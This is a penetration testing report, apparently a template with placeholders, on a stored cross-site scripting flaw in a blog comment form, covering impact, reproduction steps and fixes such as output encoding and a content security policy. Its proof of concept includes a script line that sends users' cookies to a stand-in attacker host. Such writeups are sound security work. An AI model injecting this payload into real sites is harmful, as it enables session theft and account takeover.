# Penetration Testing Writeup: Stored Cross-Site Scripting (XSS) Vulnerability

## Executive Summary

During a penetration test on [Target Application], a critical Stored Cross-Site
Scripting (XSS) vulnerability was discovered in the application's comment
system. This flaw allows attackers to inject malicious scripts that execute in
the browsers of all users viewing the affected page, potentially leading to
account takeover, data theft, or website defacement. This report outlines the
vulnerability details, impact, proof of concept, and remediation steps.

## Vulnerability Details

- **Vulnerability Type**: Cross-Site Scripting (XSS) - Stored
- **Severity**: Critical
- **Affected Component**: Comment submission form on the blog page
- **CWE**: CWE-79 (Improper Neutralization of Input During Web Page Generation)
- **Location**: `https://[target-application]/blog/post/[post-id]#comments`
- **Discovered By**: [PenTester Name]
- **Date Discovered**: August 20, 2025

### Description

The comment submission form on the blog page fails to sanitize user inputs
before storing them in the database. When comments are displayed, the
application renders the stored data directly into the HTML without proper
encoding, allowing attackers to embed malicious JavaScript that executes for all
users viewing the page.

### Impact

- **Account Takeover**: Attackers can steal session cookies to impersonate
  users.
- **Data Exfiltration**: Sensitive user data visible on the page can be sent to
  an attacker-controlled server.
- **Malware Distribution**: Malicious scripts can redirect users to phishing or
  malware-laden sites.
- **Reputation Damage**: Website defacement can harm the application's
  credibility.

### Proof of Concept

1. Navigate to a blog post: `https://[target-application]/blog/post/[post-id]`.
2. In the comment form, submit the payload:
   `<script>alert('Stored XSS');</script>`.
3. Reload the page and observe an alert box with the message "Stored XSS".
4. A malicious payload could be:
   `<script>document.location='https://attacker.com/steal?cookie='+document.cookie;</script>`
   to exfiltrate cookies.

### Steps to Reproduce

1. Visit `https://[target-application]/blog/post/[post-id]`.
2. Enter `<script>alert('Stored XSS');</script>` in the comment form.
3. Submit the comment.
4. Refresh the page to confirm the alert is triggered for all users.

## Remediation Recommendations

1. **Input Sanitization**:
   - Use a server-side library like OWASP AntiSamy to filter out malicious code
     from user inputs before storage.
   - Validate inputs to allow only safe characters (e.g., alphanumeric, limited
     punctuation).
2. **Output Encoding**:
   - Apply HTML entity encoding (e.g., `<` to `&lt;`) when rendering comments in
     the browser.
3. **Content Security Policy (CSP)**:
   - Implement a CSP header:
     `Content-Security-Policy: script-src 'self'; object-src 'none';`.
4. **Database Sanitization**:
   - Sanitize stored data to prevent execution of scripts retrieved from the
     database.
5. **Security Training**:
   - Train developers on secure coding to mitigate XSS risks.

## Conclusion

The Stored XSS vulnerability in [Target Application]’s comment system is a
critical issue requiring immediate remediation to protect users and maintain
trust. Implementing the recommended measures will significantly reduce the risk
of exploitation.

## References

- OWASP XSS Prevention Cheat Sheet:
  https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html
- CWE-79: https://cwe.mitre.org/data/definitions/79.html

![Stored XSS Alert](https://example.com/images/stored-xss-alert.png)
